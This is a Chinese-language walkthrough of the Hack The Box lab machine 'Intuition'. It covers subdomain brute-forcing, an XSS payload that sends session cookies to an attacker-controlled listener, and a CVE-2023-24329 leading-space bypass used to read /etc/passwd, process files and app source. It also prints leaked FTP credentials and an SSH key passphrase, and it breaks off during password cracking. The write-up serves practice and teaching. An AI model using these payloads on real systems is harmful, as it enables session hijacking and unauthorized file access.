---
cover: ../../.gitbook/assets/image (9).png
coverY: 0
layout:
  cover:
    visible: true
    size: hero
  title:
    visible: true
  description:
    visible: true
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# 🧘‍♂️ Week 2 - Intuition

## 信息收集

### Nmap 端口探测

<figure><img src="../../.gitbook/assets/image (10).png" alt=""><figcaption></figcaption></figure>

获取开放端口 22/ssh 80/http.

### WEB服务相关信息收集

#### 获取域名

首先域名访问web服务,获取域名为 comprezzor.htb

<figure><img src="../../.gitbook/assets/image (11).png" alt=""><figcaption></figcaption></figure>

#### 子域名爆破

HTB都是虚拟环境,虚假的域名,自能用爆破的形式获取子域名.

```
dnsmap comprezzor.htb -w /usr/share/wordlists/subdomains-1000.txt
```

其中子域名列表来自 GitHub.

{% embed url="https://github.com/DictionaryHouse/Subdomain_List/blob/master/subdomains-1000.txt" %}

<figure><img src="../../.gitbook/assets/image (12).png" alt=""><figcaption></figcaption></figure>

共探测到三个子域名:

* **auth.comprezzor.htb**
* **report.comprezzor.htb**
* **dashboard.comprezzor.htb**

#### 目录扫描

1. **comprezzor.htb**\
   ![](<../../.gitbook/assets/image (13).png>)
2. **auth.comprezzor.htb**\
   ![](<../../.gitbook/assets/image (14).png>)\
   \[17:54:00] 200 - 3KB - **/login**\
   \[17:54:01] 500 - 265B - **/logout**\
   \[17:54:21] 200 - 3KB - **/register**
3. **report.comprezzor.htb**\
   ![](<../../.gitbook/assets/image (15).png>)
4. **dashboard.comprezzor.htb**\
   ![](<../../.gitbook/assets/image (16).png>)

### 探索WEB服务可能的漏洞点

#### comprezzor.htb 下的压缩服务可能存在xz后门

<figure><img src="../../.gitbook/assets/image (17).png" alt=""><figcaption></figcaption></figure>

最近大名鼎鼎的xz后门事件,但是据了解,这个后门没有披露具体用法,所以可以知道这应该是个兔子洞.

#### report.comprezzor.htb/report\_bug 下的漏洞报告服务可能存在XSS漏洞

<figure><img src="../../.gitbook/assets/image (18).png" alt=""><figcaption></figcaption></figure>

#### auth.comprezzor.htb 登录与注册服务可能存在SQL注入

<figure><img src="../../.gitbook/assets/image (19).png" alt=""><figcaption></figcaption></figure>

尝试无果.

## 获取第一个 user flag

### 利用 XSS 漏洞外带 webdav 用户的 Cookie

首先, 注册一个账号!!!! 进入 report 页面.

开启监听:

```bash
nc -lvvp 555
```

<figure><img src="../../.gitbook/assets/image (20).png" alt=""><figcaption></figcaption></figure>

payload:

```html
<img src=x onerror="fetch('http://10.10.14.xx:555/?cookie='+document.cookie);" >
```

<figure><img src="../../.gitbook/assets/image (21).png" alt=""><figcaption></figcaption></figure>

成功获得cookie!!!

```
user_data=eyJ1c2VyX2lkIjogMiwgInVzZXJuYW1lIjogImFkYW0iLCAicm9sZSI6ICJ3ZWJkZXYifXw1OGY2ZjcyNTMzOWNlM2Y2OWQ4NTUyYTEwNjk2ZGRlYmI2OGIyYjU3ZDJlNTIzYzA4YmRlODY4ZDNhNzU2ZGI4
```

<figure><img src="../../.gitbook/assets/image (22).png" alt=""><figcaption></figcaption></figure>

浏览器中添加 cookie , 这里使用的插件是 modheader

<figure><img src="../../.gitbook/assets/image (23).png" alt=""><figcaption></figcaption></figure>

### 利用 XSS 漏洞外带 admin 用户的 cookie

拿到 cookie 我们能做什么 ? 当然是去 dashboard 一探究竟 !

<figure><img src="../../.gitbook/assets/image (24).png" alt=""><figcaption></figcaption></figure>

可以看到我们提交的漏洞报告, 检查了一遍, webdev没啥用.

尝试把权重提高, 看能不能提交给上层更高权限的用户. 记得开nc的监听.

<figure><img src="../../.gitbook/assets/image (25).png" alt=""><figcaption></figcaption></figure>

等一等,如果没收到就重启一下机子.

获得Cookie:

<pre><code><strong>user_data=eyJ1c2VyX2lkIjogMSwgInVzZXJuYW1lIjogImFkbWluIiwgInJvbGUiOiAiYWRtaW4ifXwzNDgyMjMzM2Q0NDRhZTBlNDAyMmY2Y2M2NzlhYzlkMjZkMWQxZDY4MmM1OWM2MWNmYmVhMjlkNzc2ZDU4OWQ5
</strong></code></pre>

更换这个cookie,再次访问dashboard, 就多出来了好多功能.

<figure><img src="../../.gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>

### Create PDF Report 存在本地/远程文件包含等漏洞&#x20;

这个页面大概率是漏洞点, 但是存在黑名单或者白名单的规则限制 ,尝试下只能访问http协议.

<figure><img src="../../.gitbook/assets/image (7).png" alt=""><figcaption></figcaption></figure>

使用nc监听, 看看能收集到什么信息.

<figure><img src="../../.gitbook/assets/image (8).png" alt=""><figcaption></figcaption></figure>

可以看到发来的包, 用的是Python-urllib/3.11, 大概率可以确定该服务是 flask.

Google一下这个包,发现存在解析漏洞.

{% embed url="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-24329" %}

在访问的链接最前面添加一个空格,就可以绕过urlparse()函数对协议的检查.

构造payload (不要漏了前面的空格):

```
 file:///etc/passwd
```

<figure><img src="../../.gitbook/assets/image (28).png" alt=""><figcaption></figcaption></figure>

然后挺奇怪的,真正的用户只有一个 root ,这个时候其实怀疑这个是在容器内, 访问根目录下的.dockerenv, 确实能够成功下载,可以证明确实是在 docekr 容器内.

<figure><img src="../../.gitbook/assets/image (29).png" alt=""><figcaption></figcaption></figure>

在容器内,能够获取的有效的信息就比较有限, 特别实在这种盲盒的形式下, 现在就把希望放在了源代码上了.

根据 linux man5 手册下, /proc/self/cmdline 为存放在执行当前进程的命令的只读文件,.

{% embed url="https://man7.org/linux/man-pages/man5/proc.5.html" %}

构造payload (不要漏了前面的空格):

```
 file:///proc/self/cmdline
```

<figure><img src="../../.gitbook/assets/image (30).png" alt=""><figcaption></figcaption></figure>

可以知道启动web项目时,使用的指令为

```bash
python3 /app/code/app.y
```

也就知道了 flask 的入口py文件.

继续构造payload获取app.py的源码:

```bash
 file:///app/code/app.py
```

<figure><img src="../../.gitbook/assets/image (31).png" alt=""><figcaption></figcaption></figure>

整理后的代码:

```python
from flask import Flask, request, redirect
from blueprints.index.index import main_bp
from blueprints.report.report import report_bp
from blueprints.auth.auth import auth_bp
from blueprints.dashboard.dashboard import dashboard_bp

app = Flask(__name__)
app.secret_key = "7ASS7ADA8RF3FD7"
app.config['SERVER_NAME'] = 'comprezzor.htb'
app.config['MAX_CONTENT_LENGTH'] = 5 * 1024 * 1024  # Limit file size to 5MB
ALLOWED_EXTENSIONS = {'txt', 'pdf', 'docx'}  # Add more allowed file extensions if needed

app.register_blueprint(main_bp)
app.register_blueprint(report_bp, subdomain='report')
app.register_blueprint(auth_bp, subdomain='auth')
app.register_blueprint(dashboard_bp, subdomain='dashboard')

if __name__ == '__main__':
    app.run(debug=False, host="0.0.0.0", port=80)
```

从 flask 的蓝图可以知道, 三个子域名以及主域名下代码的路径:

* /app/code/blueprints/index/index.py
* /app/code/blueprints/report/report.py
* /app/code/blueprints/auth/auth.py
* /app/code/blueprints/dashboard/dashboard.py

同样的方式,构造payload获取这些源码:

{% tabs %}
{% tab title="dashboard.py" %}
```python
from flask import Blueprint, request, render_template, flash, redirect, url_for, send_file
from blueprints.auth.auth_utils import admin_required, login_required, deserialize_user_data
from blueprints.report.report_utils import get_report_by_priority, get_report_by_id, delete_report, get_all_reports, change_report_priority, resolve_report
import random, os, pdfkit, socket, shutil
import urllib.request
from urllib.parse import urlparse
import zipfile
from ftplib import FTP
from datetime import datetime

dashboard_bp = Blueprint('dashboard', __name__, subdomain='dashboard')

pdf_report_path = os.path.join(os.path.dirname(__file__), 'pdf_reports')
allowed_hostnames = ['report.comprezzor.htb']

@dashboard_bp.route('/', methods=['GET'])
@admin_required
def dashboard():
    user_data = request.cookies.get('user_data')
    user_info = deserialize_user_data(user_data)
    if user_info['role'] == 'admin':
        reports = get_report_by_priority(1)
    elif user_info['role'] == 'webdev':
        reports = get_all_reports()
    return render_template('dashboard/dashboard.html', reports=reports, user_info=user_info)

@dashboard_bp.route('/report/', methods=['GET'])
@login_required
def get_report(report_id):
    user_data = request.cookies.get('user_data')
    user_info = deserialize_user_data(user_data)
    if user_info['role'] in ['admin', 'webdev']:
        report = get_report_by_id(report_id)
        return render_template('dashboard/report.html', report=report, user_info=user_info)
    else:
        pass

@dashboard_bp.route('/delete/', methods=['GET'])
@login_required
def del_report(report_id):
    user_data = request.cookies.get('user_data')
    user_info = deserialize_user_data(user_data)
    if user_info['role'] in ['admin', 'webdev']:
        report = delete_report(report_id)
        return redirect(url_for('dashboard.dashboard'))
    else:
        pass

@dashboard_bp.route('/resolve', methods=['POST'])
@login_required
def resolve():
    report_id = int(request.args.get('report_id'))
    if resolve_report(report_id):
        flash('Report resolved successfully!', 'success')
    else:
        flash('Error occurred while trying to resolve!', 'error')
    return redirect(url_for('dashboard.dashboard'))

@dashboard_bp.route('/change_priority', methods=['POST'])
@admin_required
def change_priority():
    user_data = request.cookies.get('user_data')
    user_info = deserialize_user_data(user_data)
    if user_info['role'] != ('webdev' or 'admin'):
        flash('Not enough permissions. Only admins and webdevs can change report priority.', 'error')
        return redirect(url_for('dashboard.dashboard'))
    report_id = int(request.args.get('report_id'))
    priority_level = int(request.args.get('priority_level'))
    if change_report_priority(report_id, priority_level):
        flash('Report priority level changed!', 'success')
    else:
        flash('Error occurred while trying to change the priority!', 'error')
    return redirect(url_for('dashboard.dashboard'))

@dashboard_bp.route('/create_pdf_report', methods=['GET', 'POST'])
@admin_required
def create_pdf_report():
    global pdf_report_path
    if request.method == 'POST':
        report_url = request.form.get('report_url')
        try:
            scheme = urlparse(report_url).scheme
            hostname = urlparse(report_url).netloc
            try:
                dissallowed_schemas = ["file", "ftp", "ftps"]
                if (scheme not in dissallowed_schemas) and ((socket.gethostbyname(hostname.split(":")[0]) != '127.0.0.1') or (hostname in allowed_hostnames)):
                    print(scheme)
                    urllib_request = urllib.request.Request(report_url, headers={'Cookie': 'user_data=eyJ1c2VyX2lkIjogMSwgInVzZXJuYW1lIjogImFkbWluIiwgInJvbGUiOiAiYWRtaW4ifXwzNDgyMjMzM2Q0NDRhZTBlNDAyMmY2Y2M2NzlhYzlkMjZkMWQxZDY4MmM1OWM2MWNmYmVhM'})
                    response = urllib.request.urlopen(urllib_request)
                    html_content = response.read().decode('utf-8')
                    pdf_filename = f'{pdf_report_path}/report_{str(random.randint(10000,90000))}.pdf'
                    pdfkit.from_string(html_content, pdf_filename)
                    return send_file(pdf_filename, as_attachment=True)
                else:
                    flash('Invalid URL', 'error')
                    return render_template('dashboard/create_pdf_report.html')
            except:
                flash('Unexpected error!', 'error')
                return render_template('dashboard/create_pdf_report.html')
        except Exception as e:
            raise e
    else:
        return render_template('dashboard/create_pdf_report.html')

@dashboard_bp.route('/backup', methods=['GET'])
@admin_required
def backup():
    source_directory = os.path.abspath(os.path.dirname(__file__) + '../../../')
    current_datetime = datetime.now().strftime("%Y%m%d%H%M%S")
    backup_filename = f'app_backup_{current_datetime}.zip'
    with zipfile.ZipFile(backup_filename, 'w', zipfile.ZIP_DEFLATED) as zipf:
        for root, _, files in os.walk(source_directory):
            for file in files:
                file_path = os.path.join(root, file)
                arcname = os.path.relpath(file_path, source_directory)
                zipf.write(file_path, arcname=arcname)
    try:
        ftp = FTP('ftp.local')
        ftp.login(user='ftp_admin', passwd='u3jai8y71s2')
        ftp.cwd('/')
        with open(backup_filename, 'rb') as file:
            ftp.storbinary(f'STOR {backup_filename}', file)
        ftp.quit()
        os.remove(backup_filename)
        flash('Backup and upload completed successfully!', 'success')
    except Exception as e:
        flash(f'Error: {str(e)}', 'error')
    return redirect(url_for('dashboard.dashboard'))
```
{% endtab %}

{% tab title="index.py" %}
```python
import os
from flask import Flask, Blueprint, request, render_template, redirect, url_for, flash, send_file
from werkzeug.utils import secure_filename
import lzma

app = Flask(__name__)
app.config['MAX_CONTENT_LENGTH'] = 5 * 1024 * 1024  # Limit file size to 5MB
UPLOAD_FOLDER = 'uploads'
ALLOWED_EXTENSIONS = {'txt', 'pdf', 'docx'}  # Add more allowed file extensions if needed

main_bp = Blueprint('main_bp', __name__, template_folder='./templates/')

def allowed_file(filename):
    return '.' in filename and filename.rsplit('.', 1)[1].lower() in ALLOWED_EXTENSIONS

@main_bp.route('/', methods=['GET', 'POST'])
def index():
    if request.method == 'POST':
        if 'file' not in request.files:
            flash('No file part', 'error')
            return redirect(request.url)
        file = request.files['file']
        if file.filename == '':
            flash('No selected file', 'error')
            return redirect(request.url)
        if not allowed_file(file.filename):
            flash('Invalid file extension. Allowed extensions: txt, pdf, docx', 'error')
            return redirect(request.url)
        if file and allowed_file(file.filename):
            filename = secure_filename(file.filename)
            uploaded_file = os.path.join(app.root_path, UPLOAD_FOLDER, filename)
            file.save(uploaded_file)
            print(uploaded_file)
            flash('File successfully compressed!', 'success')
            with open(uploaded_file, 'rb') as f_in:
                with lzma.open(os.path.join(app.root_path, UPLOAD_FOLDER, f"{filename}.xz"), 'wb') as f_out:
                    f_out.write(f_in.read())
            compressed_filename = f"{filename}.xz"
            file_to_send = os.path.join(app.root_path, UPLOAD_FOLDER, compressed_filename)
            response = send_file(file_to_send, as_attachment=True, download_name=f"{filename}.xz", mimetype="application/x-xz")
            os.remove(uploaded_file)
            os.remove(file_to_send)
            return response
        return redirect(url_for('main_bp.index'))
    return render_template('index/index.html')
```
{% endtab %}

{% tab title="report.py" %}


```python
from flask import Blueprint, render_template, request, flash, url_for, redirect
from .report_utils import *
from blueprints.auth.auth_utils import deserialize_user_data
from blueprints.auth.auth_utils import admin_required, login_required

report_bp = Blueprint("report", __name__, subdomain="report")

@report_bp.route("/", methods=["GET"])
def report_index():
    return render_template("report/index.html")

@report_bp.route("/report_bug", methods=["GET", "POST"])
@login_required
def report_bug():
    if request.method == "POST":
        user_data = request.cookies.get("user_data")
        user_info = deserialize_user_data(user_data)
        name = user_info["username"]
        report_title = request.form["report_title"]
        description = request.form["description"]
        if add_report(name, report_title, description):
            flash("Bug report submitted successfully! Our team will be checking on this shortly.", "success")
        else:
            flash("Error occured while trying to add the report!", "error")
        return redirect(url_for("report.report_bug"))
    return render_template("report/report_bug_form.html")

@report_bp.route("/list_reports")
@login_required
@admin_required
def list_reports():
    reports = get_all_reports()
    return render_template("report/report_list.html", reports=reports)

@report_bp.route("/report/")
@login_required
@admin_required
def report_details(report_id):
    report = get_report_by_id(report_id)
    print(report)
    if report:
        return render_template("report/report_details.html", report=report)
    else:
        flash("Report not found!", "error")
        return redirect(url_for("report.report_index"))

@report_bp.route("/about_reports", methods=["GET"])
def about_reports():
    return render_template("report/about_reports.html")
```
{% endtab %}

{% tab title="auth.py" %}
```python
from flask import Flask, Blueprint, request, render_template, redirect, url_for, flash, make_response
from .auth_utils import *
from werkzeug.security import check_password_hash

app = Flask(__name__)
auth_bp = Blueprint('auth', __name__, subdomain='auth')

@auth_bp.route('/')
def index():
    return redirect(url_for('auth.login'))

@auth_bp.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        username = request.form['username']
        password = request.form['password']
        user = fetch_user_info(username)
        if (user is None) or not check_password_hash(user[2], password):
            flash('Invalid username or password', 'error')
            return redirect(url_for('auth.login'))
        serialized_user_data = serialize_user_data(user[0], user[1], user[3])
        flash('Logged in successfully!', 'success')
        response = make_response(redirect(get_redirect_url(user[3])))
        response.set_cookie('user_data', serialized_user_data, domain='.comprezzor.htb')
        return response
    return render_template('auth/login.html')

@auth_bp.route('/register', methods=['GET', 'POST'])
def register():
    if request.method == 'POST':
        username = request.form['username']
        password = request.form['password']
        user = fetch_user_info(username)
        if user is not None:
            flash('User already exists', 'error')
            return redirect(url_for('auth.register'))
        if create_user(username, password):
            flash('Registration successful! You can now log in.', 'success')
            return redirect(url_for('auth.login'))
        else:
            flash('Unexpected error occured while trying to register!', 'error')
    return render_template('auth/register.html')

@auth_bp.route('/logout')
def logout():
    pass
```
{% endtab %}
{% endtabs %}

这里重点在 dashboard.py 下的 backup 函数, 暴露了 ftp 服务的账号和密码.

```
host:   ftp.local
user:   ftp_admin
passwd: u3jai8y71s2
```

继续利用本地文件包含, 构造payload如下, 查看ftp内有啥文件:

```
 ftp://ftp_admin:u3jai8y71s2@ftp.local/
```

<figure><img src="../../.gitbook/assets/image (32).png" alt=""><figcaption></figcaption></figure>

可以看到, 有私钥!!! 但是还不知道username!! 利用同样的方式,把私钥和welcome\_note.txt都down下来看看.

<figure><img src="../../.gitbook/assets/image (33).png" alt=""><figcaption><p>私钥</p></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (34).png" alt=""><figcaption></figcaption></figure>

这里可以看到,他还把私钥加密了, passphrase 为 Y27SH19HDIWD , 可以用 ssh-add 加入key, 获取用户名.

<figure><img src="../../.gitbook/assets/image (35).png" alt=""><figcaption></figcaption></figure>

得到用户名为 dev\_acc.

### 激动人心, ssh 连接上主机, 获取 user flag

```bash
ssh dev_acc@10.10.11.15 -i id_rsa
```

<figure><img src="../../.gitbook/assets/image (36).png" alt=""><figcaption></figcaption></figure>

## 后渗透信息收集

### Linpeas 获取信息

二话不说, 先上 linpeas .

{% embed url="https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS" %}

把比较有用的信息截了个图.

**user 用户:**

<figure><img src="../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>

除了登录的用户, 还有几个用户.

**用户组:**

<figure><img src="../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>

用户组中也有些有意思的, adam 和 lopez 用户都在 sys-adm 用户组中, 大概率权限比较高.

**/opt 目录下:**

![](<../../.gitbook/assets/image (2).png>)

有些东西, 其中有的是sys-adm组的权限

**.db 文件**

<figure><img src="../../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>

user.db 是 web 服务用的, 在前面的代码里也有出现, 值得关注.

### 查看 usesr.db 破解获得 adam 密码

到 /var/www/app/blueprints/auth/, 使用 sqlite3 读取数据库.

```bash
sqlite3 users.db
```

<figure><img src="../../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>

破解电脑现在不太行, 有点跑不动😭
